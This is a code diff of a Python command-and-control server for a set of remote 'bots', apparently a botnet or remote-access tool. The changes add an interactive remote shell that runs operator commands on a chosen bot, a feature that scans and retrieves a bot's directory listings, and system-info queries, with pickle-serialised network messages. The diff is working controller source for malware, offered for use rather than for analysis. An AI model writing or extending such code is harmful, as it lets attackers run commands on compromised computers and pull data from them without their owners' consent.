@@ -17,6 +17,7 @@ standard_text = Fore.YELLOW
 warning_text = Fore.RED + Style.BRIGHT
 users = []
 user_file = 'users.json'
+buf_size = 4096
 
 def is_int(str):
     try:
@@ -59,6 +60,8 @@ class User():
         self.msg = None
         self.alive = True if conn else False
         self.id = ''.join(random.choices(string.ascii_lowercase, k=8))
+        self.expected_size = None
+        self.tmp_part = None
         if self.alive:
             self.hist.append({'from': 'server', 'msg': 'client connected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
             threading.Thread(target=self.keep_alive, args=()).start()
@@ -74,7 +77,7 @@ class User():
     def keep_alive(self):
         while self.alive:
             try:
-                self.conn[0].send(pickle.dumps('keepalive'))
+                self.conn[0].send(pickle.dumps({'type': 'keepalive'}))
                 time.sleep(3)
             except:
                 self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
@@ -85,39 +88,56 @@ class User():
         self.conn[0].send(pickle.dumps(msg))
         self.hist.append({'from': 'server', 'msg': msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
 
-    def get_response(self): #todo timeout exits immediately
+    def get_response(self, alert=True):
         # get next msg from user
         self.start = time.time()
-        print(standard_text + 'Waiting for client response...')
+        if alert:
+            print(standard_text + 'Waiting for client response...')
         self.old_num = len([m for m in self.hist if m['from'] == 'client'])
         while self.alive and self.old_num == len([m for m in self.hist if m['from'] == 'client']) and time.time() - self.start < 30:
             pass
         if not self.alive:
-            return 'Clent disconnected'
+            return {'exit': 1, 'msg': 'Clent disconnected'}
         elif time.time() - self.start > 30:
-            return 'Client response timed out'
+            return {'exit': 1, 'msg': 'Client response timed out'}
         else:
             return [m for m in self.hist if m['from'] == 'client'][-1]['msg']
 
     def read(self):
         try:
-            self.msg = self.conn[0].recv(4096)
-            self.msg = clean(self.msg)
+            if self.expected_size:
+                self.msg = []
+                while self.expected_size > 0:
+                    self.tmp_part = self.conn[0].recv(min(self.expected_size, buf_size))
+                    if not self.tmp_part:
+                        raise Exception('Unexpected EOF')
+                    self.msg.append(self.tmp_part)
+                    self.expected_size -= len(self.tmp_part)
+                self.msg = b''.join(self.msg)
+                self.msg = clean(self.msg)
+                self.expected_size = None
+
+                if self.msg != -1:
+                    self.hist.append({'from': 'client', 'msg': self.msg,
+                                      'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
+                    return self.msg
+            else:
+                self.msg = self.conn[0].recv(buf_size)
+                self.msg = clean(self.msg)
+                self.expected_size = self.msg['incoming']
         except:
+            traceback.print_exc()
             self.hist.append({'from': 'server', 'msg': 'client disconnected', 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
             self.alive = False
             return -2
-        if self.msg != -1:
-            self.hist.append({'from': 'client', 'msg': self.msg, 'timestamp': datetime.now().strftime('%m-%d-%Y %I:%M:%S%p')})
-            return self.msg
 
     def manage(self):
         while self.alive:
             self.m = self.read()
             if self.m == -2:
                 return
-            elif not self.m:
-                self.send('Invalid input recieved')
+            #elif not self.m:
+            #    self.send('Invalid input recieved')
 
 def clean(msg):
     try:
@@ -126,7 +146,7 @@ def clean(msg):
     except ValueError:
         return -1
 
-def get_instructions(): #todo add file down/uploading from bot, get bot's file structure, add more options
+def get_instructions(): #todo add file down/uploading from bot, add more options
     opt = get_choice(['Select a bot'], 'Main Menu')
     if opt == 0:
         if len(users) > 0:
@@ -138,21 +158,49 @@ def get_instructions(): #todo add file down/uploading from bot, get bot's file s
                 opt = get_choice(bot_opts, 'Choose an action:', subtitle=f'For: {user.name} | {user.ip} | {Fore.GREEN + "ALIVE" if user.alive else Fore.RED + "DEAD"}')
                 if opt == 0:
                     if user.alive:
-                        #TODO turn this section into shell
-                        print('shellllllllllllllllllllllllllllll')
+                        print('"Exit" to exit shell')
+                        print('Starting shell...')
+                        user.send({'type': 'shell', 'cmd': 'get_loc'})
+                        response = user.get_response(alert=False)['msg']
+                        next_cmd = None
+                        while next_cmd != 'exit':
+                            next_cmd = input(f'{response["loc"]}>')
+                            user.send({'type': 'shell', 'cmd': next_cmd})
+                            response = user.get_response(alert=False)
+                            exit_code = response['exit']
+                            response = response['msg']
+                            if 'output' in response:
+                                #while 'working' in response:
+                                #    response = user.get_response(alert=False)['msg']
+                                #    print(response['output'])
+                                if exit_code == 0:
+                                    print(response['output'])
+                                else:
+                                    print(warning_text + 'Error: ' + response['output'])
+                        print('Closed shell')
                     else:
                         print(warning_text + 'Dead bot, chose a live one')
                 elif opt == 1:
                     if user.alive:
-                        print('todo get bots files') #todo get bots files
+                        scan_dir = input('Enter directory to scan: ')
+                        output_file = input('Enter filename to save results to (blank to display results in terminal): ')
+                        user.send({'type': 'getfiles', 'loc': scan_dir})
+                        response = user.get_response()
+                        if output_file == '' or response['exit'] == 1:
+                            print(standard_text + f'Client info received from {user.name}:')
+                            show(response['msg'])
+                        else:
+                            with open(output_file, 'w') as f:
+                                f.write(response['msg'])
+                            print(standard_text + f'Wrote results from client to {output_file}')
                     else:
                         print(warning_text + 'Dead bot, chose a live one')
                 elif opt == 2:
                     if user.alive:
-                        user.send('getinfo')
+                        user.send({'type': 'getinfo'})
                         response = user.get_response()
                         print(standard_text + f'Client info received from {user.name}:')
-                        show(response)
+                        show(response['msg'])
                     else:
                         print(warning_text + 'Dead bot, chose a live one')
                 elif opt == 3:
@@ -169,19 +217,19 @@ def run():
     print(standard_text + f'Server running on {addr[0]}:{addr[1]}')
     print(standard_text + 'Wait a few seconds for any live bots to connect')
 
-    threading.Thread(target=get_instructions, args=()).start()
-
-    # create inactive user objs for saved ips
+    # create inactive user objects for saved ips
     if os.path.isfile(user_file):
         with open(user_file, 'r') as f:
             read_users = json.load(f)
         for u in read_users:
             users.append(User(ip=u, name=read_users[u]))
 
+    threading.Thread(target=get_instructions, args=()).start()
+
     while True:
         conn = server.accept()
         try:
-            name = conn[0].recv(4096)
+            name = conn[0].recv(buf_size)
             name = clean(name)['name']
             user = None
             for u in users:
